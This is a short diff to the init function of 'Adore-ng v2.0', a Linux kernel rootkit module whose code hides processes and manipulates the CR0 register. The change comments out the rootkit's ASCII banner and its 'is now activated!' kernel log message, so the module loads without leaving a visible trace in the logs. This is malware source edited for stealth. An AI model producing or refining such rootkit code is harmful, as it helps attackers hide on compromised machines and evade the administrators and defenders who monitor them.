@@ -818,7 +818,7 @@ int __init adore_init(void)
 	struct module *me = NULL;
 
 	memset(hidden_procs, 0, sizeof(hidden_procs));
-
+        /*
 	printk(LOG_ADORE"\n");
 	printk(LOG_ADORE" ▄▄▄      ▓█████▄  ▒█████   ██▀███  ▓█████        ███▄    █   ▄████ \n");
 	printk(LOG_ADORE" ▒████▄    ▒██▀ ██▌▒██▒  ██▒▓██ ▒ ██▒▓█   ▀        ██ ▀█   █  ██▒ ▀█▒ \n");
@@ -830,7 +830,7 @@ int __init adore_init(void)
 	printk(LOG_ADORE"	   ░   ▒    ░ ░  ░ ░ ░ ░ ▒    ░░   ░    ░            ░   ░ ░ ░ ░   ░ \n");
 	printk(LOG_ADORE"	         ░  ░   ░        ░ ░     ░        ░  ░               ░       ░ \n");
 	printk(LOG_ADORE"			            ░                                                       \n"); 
-
+        */
 	/* Hide process. */
 	if (hide_pid != -1)
 	{
@@ -906,7 +906,7 @@ int __init adore_init(void)
 
 	setback_cr0(orig_cr0);
 	
-	printk(LOG_ADORE"Adore-ng v2.0 is now activated!\n"); 
+//	printk(LOG_ADORE"Adore-ng v2.0 is now activated!\n"); 
 	
 	return 0;
 }
